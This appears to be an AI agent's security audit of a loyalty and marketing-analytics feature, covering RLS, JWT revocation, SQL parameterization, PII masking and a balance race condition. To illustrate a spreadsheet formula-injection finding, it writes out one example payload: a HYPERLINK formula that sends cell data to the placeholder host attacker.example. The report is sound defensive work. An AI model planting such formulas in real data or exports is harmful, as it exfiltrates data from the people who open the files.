# TASK-412: Security review — Loyalty + Marketing Analytics (Фаза 0 + Фаза 1)

**Agent:** security-reviewer
**Date:** 2026-07-26
**Status:** done — **verdict: NOT clear to ship as-is.** 1 critical blocker (remotely exploitable
by any anonymous member of the public), 1 high-priority integrity bug, plus several
lower-severity items. See "Overall verdict" at the end.

## Scope

Read all 8 task logs (404–411) for context, then read the actual code directly (entities,
migration SQL, controllers, services, repositories, `AppDbContext.cs`,
`TenantConnectionInterceptor.cs`) rather than trusting agent summaries — per the brief. No fixes
applied except where noted; this is an audit.

## Verdicts on the 9 requested items

### 1. `ConsumerAccount` with no RLS at all — **OK**
Traced every call site of `IConsumerAccountRepository.GetByIdAsync`/`GetByPhoneAsync` in the
whole backend (only 2 controllers reference `ConsumerAccount` anywhere: `ConsumerAuthController`,
`ConsumerLoyaltyController`). Confirmed:
- `ConsumerLoyaltyController.ResolveConsumerAccountId()` always sources the id from the JWT
  `consumer_account_id` claim, never from a route/body param — `JoinAsync`/
  `GetMembershipsForConsumerAsync`/`GetCurrentCodeAsync`/`GetHistoryAsync` all receive it this way.
- `LoyaltyService.ResolveCodeAsync` (staff side) only reaches `ConsumerAccount` via
  `membership.ConsumerAccountId`, itself resolved from a tenant-scoped membership lookup
  (`GetMembershipByIdAsync(membershipId, tenantId, ...)`), and only ever returns `MaskPhone(...)` —
  never the raw entity.
- `LoyaltyService.JoinAsStaffAsync` looks up by the **caller's own** phone (`GetByPhoneAsync`),
  never an arbitrary one.
No generic "GetById handed to a non-owner" path exists. This matches the documented, reviewed
precedent (`tenants`) and the architecture note in the migration/entity doc comments.

### 2. `consumer_self_access` RLS policy + `TenantConnectionInterceptor` — **OK, minor hardening recommended**
`BuildSetSql` only ever interpolates a value into the SQL string after `Guid.TryParse` succeeds
(same discipline as `app.tenant_id`/`app.user_id`); any malformed/absent claim falls to the
null-uuid fallback, which cannot match a real row — fail-closed, not fail-open. The JWT itself is
HMAC-signed server-side (`JwtService.GenerateConsumerAccessToken`) and cannot be forged with an
arbitrary `consumer_account_id`. Migration SQL (`20260726132332_AddLoyaltyProgram.cs`) matches the
task log's description exactly — NULLIF-guarded, same shape as `tenant_isolation`.

One real hardening gap: `consumer_self_access` is declared with no `FOR` clause, so it applies to
**all** commands (SELECT/INSERT/UPDATE/DELETE), not just the reads + one legitimate self-insert
(`JoinAsync`) that the consumer session actually needs today. Postgres ORs permissive policies
together, so a future bug that let a consumer-authenticated request reach an UPDATE/DELETE on
`loyalty_memberships`/`loyalty_ledger_entries` would be permitted by RLS as long as the row's own
`ConsumerAccountId` matches — e.g. a consumer directly rewriting their own `Balance` or flipping
`Status` from `blocked` back to `active`. No such code path exists today (`ConsumerLoyaltyController`
only exposes reads + Join), so this is defense-in-depth, not an active hole. Recommend splitting
into `FOR SELECT` + `FOR INSERT` policies (Postgres doesn't support a comma-separated `FOR` list)
so a future application bug can't be laundered through an over-broad RLS grant.

### 3. `TryClaimTimestepAsync` + resolve-code rate-limiter — **OK**
`ILoyaltyRepository.TryClaimTimestepAsync` (`LoyaltyRepository.cs:43-60`) is a single
`ExecuteSqlInterpolatedAsync` UPDATE, genuinely parameterized (interpolation holes become Npgsql
parameters, not string-concatenated SQL), with a `WHERE ... AND (LastRedeemedTimestep IS NULL OR
LastRedeemedTimestep < {timestep})` guard — atomic at the Postgres row level, no read-then-write
gap. `TotpService.VerifyCode` returns the actual matched period index (Otp.NET's
`VerifyTotp(..., out timestep, ...)`), not a fixed "current" value, so the anti-replay check
operates on the real matched window even under the ±1-step tolerance. Independently re-derived
the same conclusion the backend-developer already reached.

`MemoryResolveCodeAttemptTracker` (in-process, `IMemoryCache`) is keyed by **membership ID**, not
IP — this matters because `.claude/docs/known-issues.md` KI-014 already documents that per-IP
rate limiting is silently ineffective in production (the hosting provider's edge doesn't preserve
client IPs). Since this tracker isn't IP-based, it's unaffected by that specific gap; it follows
the same "per-account, not per-IP" mitigation shape KI-014 calls out as the thing that actually
works in this codebase (account lockout). Single-instance/restart-survival is a real but low-
urgency tradeoff given production today is a single Docker host (no replica count anywhere in
`docker-compose.production.yml`). Recommend: add this to `known-issues.md` explicitly (it's
currently only in a task-log comment) and revisit with Redis (already used for BullMQ) if/when the
API ever scales to multiple instances.

### 4. Consumer JWT with no revocation (30-day, confirmed real config) — **risk, needs attention**
Confirmed `backend/ShelfGuard.Api/appsettings.json:14` sets `"ConsumerAccessTokenDays": "30"` —
this is the actual production default, not just a dev/doc claim. If a `ConsumerAccount` is
compromised (password guessed/leaked) or the legitimate owner changes their password, the old
token keeps working for up to 30 days with no way to invalidate it — there is no blocklist, no
`jti` tracking, and no comparison against a "password changed at" timestamp. This is a real gap,
not just a theoretical one, since ShelfGuard already has the infrastructure to do a cheap partial
mitigation: add a `PasswordChangedAt`-style column check (or reuse the existing pattern from
`RefreshToken`/`User` if one exists) compared against the token's `iat`, without building a full
refresh-token flow. Recommend: at minimum, shorten the default TTL substantially (e.g. 3-7 days)
until a revocation mechanism exists, and treat "add a cheap issued-before-password-change check" as
a near-term follow-up rather than accepting the full 30-day exposure window indefinitely. Not
necessarily a hard blocker for an initial limited rollout, but should not be left as-is for a
public-facing consumer auth surface at scale.

### 5. `MarketingAnalyticsRepository.cs` raw-SQL parametrization — **OK, fully verified**
Read every one of the 9 raw-SQL methods end to end. Every SQL string is a `const string` C# 11
raw string literal (`"""..."""`) with **no** string interpolation (`$"""`) or concatenation
anywhere — `tenantId`, the `stores` array, `fromDt`/`toDt`, `anchorProductName`/`productName`/
`pairedProductName`, `candidatePoolSize`/`topN`/`limit` are all passed as `{n}` positional
arguments to `SqlQueryRaw<T>(sql, arg0, arg1, ...)`, which EF Core rewrites into real Npgsql
parameters. Free-text product names (fully attacker/user-influenceable via the affinity/basket/
export endpoints) only ever land as bound parameter values, never inside the SQL text itself (no
dynamic column/table names). No injection vector found in any of the 9 methods.

### 6. PII masking / export capability gate — **risk, needs attention (2 distinct issues)**

**(a) The `marketing_analytics.export_pii` capability is dead code.** Compare
`MarketingAnalyticsController`'s class-level gate — `[Authorize(Policy =
AppPolicies.CanViewAnalytics)]`, i.e. `RequireRole([Provider, EnterpriseAdmin, NetworkManager,
StoreManager])` — against `MarketingAnalyticsAuthorization.CanExportPii`'s first branch —
`AppPolicies.AtLeastStoreManagerRoles.Any(user.IsInRole)`, which is **the exact same 4-role set**.
Since ASP.NET's role-based `[Authorize]` rejects anyone outside that set before the action method
(and thus `CanExportPii`) ever runs, nobody who lacks one of those 4 roles can ever reach the
capability branch — the `TenantRoleCapabilities.MarketingAnalyticsExportPii` capability (new
"Маркетинг" ADR-020 group, its own doc comment says it should let access down "to a dedicated
marketing specialist role") can never actually be exercised by anyone as coded.

This is not a hypothetical concern — it is **exactly** the bug class this codebase's own ADR-020
already discovered and documented once before. `LegalEntityAuthorization`'s class doc (which
`MarketingAnalyticsAuthorization` explicitly says it mirrors) spells out the fix: its controller's
class-level policy (`AtLeastStoreManager`) is **strictly looser** than the imperative check's own
role branch (`AtLeastEnterpriseAdminRoles`, a subset), "unlike the 7 controllers where the
class-level policy had to be removed — see ADR-020 'the blocking discovery'." `MarketingAnalytics`
copied the imperative-check *shape* without preserving that required relationship — its class-level
floor and its capability-check's role branch are identical, not strictly looser. Net effect: fails
closed (more restrictive than intended, not a leak), but the capability is functionally inert.
Recommend: either add a base `marketing_analytics.view`-style capability + a role-or-capability
class-level policy (mirroring `AnalyticsController`'s existing `AnalyticsViewOrCapability`), or
otherwise widen the controller's floor below store_manager so a granted capability holder can
actually reach the action methods at all.

**(b) Email is never masked in exports.** `MarketingAnalyticsService.BuildCustomerExcel` masks
`c.Phone` conditionally (`unmaskPii ? c.Phone : MaskPhone(c.Phone)`) but writes `c.Email` verbatim
unconditionally, regardless of `unmaskPii`/capability. Lower severity than (a) since reaching the
export endpoint at all already requires store_manager+ rank today (see (a)), but it's inconsistent
with the stated "PII masked by default" design goal, and would become a real gap the moment (a) is
fixed and a lower-rank capability holder can reach the export. Recommend masking email the same
way, or explicitly documenting that email is intentionally excluded from the masking policy.

Confirmed independently, and unaffected by the above: the actual unmask decision
(`effective.UnmaskPii = request.UnmaskPii && MarketingAnalyticsAuthorization.CanExportPii(User)`)
is computed server-side in the controller regardless of what the client sends — the frontend's
PII-toggle gating is correctly "convenience only," not the real boundary.

### 7. `FixLoyaltyTableGrants` migration (TASK-411) — **OK**
Read the actual migration file. `DO $$ ... EXECUTE format('ALTER TABLE %I OWNER TO %I', ...)`
touches **exactly** `consumer_accounts`, `loyalty_program_settings`, `loyalty_memberships`,
`loyalty_ledger_entries` — no wildcard, no dynamic table-name resolution, only the target owner
role name is resolved dynamically (from `pg_tables.tableowner` for `tenants`, a trusted system
catalog value, safely `%I`-quoted). Cannot accidentally widen ownership of anything else. `Down()`
is an intentional no-op with a documented rationale matching existing precedent in this repo.

### 8. Test gap: live-Postgres tests use `rls_audit_test_role`, not the real app connection — **confirmed real, acceptable to defer**
Independently verified in `LoyaltyRlsIntegrationTests.InitializeAsync`: it connects as `crm`
(bootstrap superuser) and does `GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO
rls_audit_test_role` — an explicit privilege grant that is completely independent of table
*ownership*. This means these tests would have stayed green through the exact TASK-411 bug
(tables owned by `crm`, zero grants to `shelfguard_app_dev`) because they never touch the real app
role at all. Confirms the gap is real, not just a documentation claim. Given the underlying bug is
already fixed and this is a detection gap rather than an active vulnerability, agree with
TASK-411's own recommendation: capture as a `known-issues.md` entry (cross-reference KI-027/KI-028,
same "role vs. ownership" bug family) and schedule a small follow-up — one live test that connects
using the actual configured `DefaultConnection` and asserts basic `SELECT` on every FORCE RLS
table — rather than treating it as a release blocker.

### 9. Rate-limit/lockout on `ConsumerAuthController` — **OK**
Both `register` and `login` carry `[EnableRateLimiting("auth-login")]` (10 req/min per client IP,
`Program.cs:90-98`, the same policy staff login uses) plus per-account lockout mirroring TASK-329
exactly (5 failures → 15 min, generic error on every failure path, timing-equalized locked-out
branch that still runs the hash verify). Same KI-014 caveat applies here as to staff auth (per-IP
partitioning is documented as ineffective in production because client IPs aren't preserved by the
hosting edge) — not a new regression, an existing, already-accepted, already-mitigated residual
risk (the IP-independent per-account lockout is what actually carries the load, per KI-014's own
re-verification). Minor, low-severity, pre-existing-pattern-level note: `RegisterAsync`'s 409
"account already exists" response is a phone-number-enumeration oracle; consistent with how most
registration UX works industry-wide, not flagging as a blocker.

## Additional findings (not in the 9-item list, found during independent code reading)

### A. CRITICAL — Stored Excel/CSV formula injection in RFM exports
`ExcelExportService.SetCellValue` (`backend/ShelfGuard.Infrastructure/Export/ExcelExportService.cs:60-94`)
writes any `string` value straight into a cell (`cell.Value = s`) with **no** neutralization of a
leading `=`, `+`, `-`, or `@` — the textbook OWASP "CSV/Formula Injection" gap. This is the
**first Excel-export feature in the whole codebase** (confirmed via the DI log's own "for future
reuse" framing), so there is no pre-existing convention being followed here; it's new exposure
introduced by this session.

End-to-end attack path, fully traced through real code, no speculation:
1. `POST /api/consumer-auth/register` is `[AllowAnonymous]` and accepts an arbitrary `FullName`
   with **zero** validation beyond non-empty (`ConsumerAuthDtos.cs:7`, `ConsumerAuthService.
   RegisterAsync` only checks `IsNullOrWhiteSpace` before `.Trim()`) — any member of the public can
   set `FullName` to e.g. `=HYPERLINK("http://attacker.example/x?d="&A1,"open")`.
2. That consumer joins a tenant's loyalty program (`LoyaltyService.JoinAsync` →
   `FindOrCreateCustomerAsync`), which creates a real `Customer` row with `Name = consumer.FullName`
   verbatim — no sanitization at that boundary either.
3. A store_manager+ (a real, trusted, legitimate user) uses this session's own new feature — segment
   or product-buyer export — which calls `MarketingAnalyticsRepository.GetExportCustomersAsync` →
   `RfmExportCustomerRow.Name` → `BuildCustomerExcel` → `ExcelExportService.SetCellValue`, unmodified.
4. The trusted user opens the downloaded `.xlsx` in Excel. The cell's content, starting with `=`,
   is parsed and evaluated as a formula by Excel, not displayed as literal text — potential data
   exfiltration (`HYPERLINK`/`WEBSERVICE`-style techniques) or worse depending on the victim's Office
   configuration.

This is remotely, anonymously exploitable with no special access at all (registration is public),
and it directly weaponizes the export feature this same session built. Recommend fixing before this
ships: in `SetCellValue`'s `case string s:` branch, if the (trimmed) string starts with `=`, `+`,
`-`, or `@`, prefix it with a `'` (or a leading space) before assigning `cell.Value` — the standard,
well-known mitigation, a few lines, no behavior change for any normal name/email/phone value.

### B. HIGH — Lost-update race condition on `LoyaltyMembership.Balance` (no optimistic concurrency)
Verified in `AppDbContext.cs` that `LoyaltyMembership`'s fluent config (lines 2075-2101) configures
**no** concurrency token at all — no `xmin`/`IsRowVersion()`/`IsConcurrencyToken()` anywhere. Compare
directly against `ProductStock` (same file, lines 438-461), which explicitly adds
`e.Property<uint>("xmin").IsRowVersion()` with a comment describing precisely this bug class: "two
concurrent writers decrementing the same batch's Quantity (e.g. two cashiers selling the last unit
at the same moment via POS) ... a silent lost update." `PosService.CreateSaleAsync` already catches
`ConcurrencyConflictException` from the stock write and returns a clean 409 "retry" — but
`LoyaltyMembership.Balance` mutations (both the redemption/accrual block in `CreateSaleAsync` and
`LoyaltyService.ManualAdjustAsync`) are plain tracked-entity updates flushed through the same
`SaveChangesAsync()`, with no equivalent protection.

Concretely: the redemption "sufficient balance"/"cap" checks
(`PosService.cs:401-410`) read `membership.Balance` from **this request's own** DbContext at the
start of handling — if two `POST /api/pos/sales` calls against the *same* membership race (two
registers, or a double-submit), both can independently read the same pre-transaction balance, both
pass validation against it, and the loser's decrement is silently overwritten rather than rejected —
letting a customer redeem more bonus value in aggregate than their actual balance permits. Requires
an authenticated `CanAccessPos` staff session (not a remote/anonymous exploit — `PosController`'s
class-level policy confirmed), so this is an insider/race-abuse risk, not a public one. Still a real
financial-integrity gap, made more notable because this exact file already demonstrates the team
knows the correct fix and applies it to a sibling entity one method away. Recommend adding the same
`xmin` + `IsRowVersion()` + catch-and-409-retry pattern to `LoyaltyMembership` before this handles
meaningful transaction volume.

### C. Lower-priority observations
- Adding `"consumer"` to `TenantConnectionInterceptor.ValidRoles` means a second class of
  validly-signed bearer JWT (never a `User` row, no `tenant_id`) can now authenticate against any of
  the app's 15 pre-existing bare-`[Authorize]` controllers (grepped; not new to this session). Spot-
  checked `SchedulesController`/`NotificationsController`: both resolve `tenantId` from the
  `tenant_id` claim and fail closed (`Forbid()`/empty) when it's absent, which a consumer token
  always is; RLS's fail-closed NULLIF-guard backs this up at the DB layer regardless of controller
  code. Pattern held in both spot-checks, but a one-time full sweep of all 15 would be worth doing
  as a follow-up rather than relying on a 2-file sample — flagging as a suggestion, not a blocker.
- Neither `MarketingAnalyticsController` nor the existing sibling `AnalyticsController` apply any
  store/location scoping beyond the tenant boundary (unlike `LocationsController`/`UsersController`'s
  Stage 3 `user_locations` scoping) — a store_manager can pass any `storeIds` within their own tenant.
  This is consistent with the pre-existing `AnalyticsController` convention, not a regression this
  session introduced; noting only so whoever tracks Stage 3 rollout completeness is aware analytics
  isn't in scope of that effort yet.
- `MarketingAdvisor.BuildUserPrompt` includes a plain inventory item name (`TopProductName`) with no
  injection-neutralization in the Claude prompt. Theoretical, low-severity prompt-injection surface —
  item names are staff-curated catalog data, not open public input, and the blast radius is limited to
  the wording of an advisory shown back to the same authorized viewer who triggered the call. Not
  flagging as actionable, noting for completeness.
- Mobile (`mobile/features/auth/store.ts`) stores the consumer token/session via `expo-secure-store`,
  matching the existing staff-token convention — no new client-side storage risk introduced.

## Overall verdict

**Not clear to release as-is.**
- **Blocker:** Finding A (Excel formula injection) — remotely exploitable by any anonymous member
  of the public via self-registration, no special access required, directly weaponizes this
  session's own new export feature. Fix is small and low-risk; recommend fixing before shipping the
  marketing-analytics export endpoints.
- **High priority, should fix soon:** Finding B (`LoyaltyMembership.Balance` lost-update race) —
  real financial-integrity gap, insider/race-access required (not a hard release blocker for a small
  initial rollout, but should not be left unaddressed as loyalty transaction volume grows).
- **Should fix, not urgent:** #4 (consumer JWT 30-day no-revocation), #6a (dead
  `export_pii` capability — contradicts this repo's own ADR-020 lesson), #6b (email never masked).
- **Accepted / documented, no action needed now:** #1, #2 (minor RLS-scope hardening optional), #3,
  #5, #7, #8 (recommend a `known-issues.md` entry), #9.

No fixes were applied in this pass (audit only, per the brief) — all of the above are
recommendations for the next implementation task(s).
